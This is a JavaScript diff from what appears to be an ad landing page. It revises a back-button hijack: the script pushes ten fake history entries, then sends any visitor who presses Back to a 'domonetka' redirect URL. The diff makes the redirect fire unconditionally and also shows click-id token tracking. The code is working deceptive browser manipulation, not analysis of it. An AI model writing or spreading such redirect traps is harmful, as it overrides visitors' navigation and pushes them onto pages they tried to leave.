@@ -58,20 +58,19 @@
     if (typeof domonetka !== 'undefined' && domonetka && domonetka.trim() !== '' && domonetka !== '{domonetka}') {
         try {
             window.onpopstate = function (event) {
-                if (event.state) {
-                    const newUrlParams = new URLSearchParams();
-                    for (const [key, value] of urlParams.entries()) {
-                        if (key !== 'ad') {
-                            newUrlParams.append(key, value);
-                        }
+                const currentUrlParams = new URLSearchParams(window.location.search);
+                const newUrlParams = new URLSearchParams();
+                for (const [key, value] of currentUrlParams.entries()) {
+                    if (key !== 'ad') {
+                        newUrlParams.append(key, value);
                     }
-                    const newUrl = `${domonetka}?${newUrlParams.toString()}`;
-                    location.replace(newUrl);
                 }
+                const newUrl = `${domonetka}?${newUrlParams.toString()}`;
+                location.replace(newUrl);
             };
 
             for (let i = 0; i < 10; i++) {
-                setTimeout(() => history.pushState({}, ""), i * 50);
+                setTimeout(() => history.pushState({}, "", window.location.href), i * 50);
             }
         } catch (error) {
             console.error(error);
@@ -108,7 +107,7 @@
     const clickid = subid;
     const address = `${window.location.protocol}//${window.location.hostname}?_update_tokens=1&sub_id=${clickid}`;
 
-    var step = 5; // шаг в секундах
+    var step = 5;
     var counter = 0;
     setInterval(function () {
         counter += step;
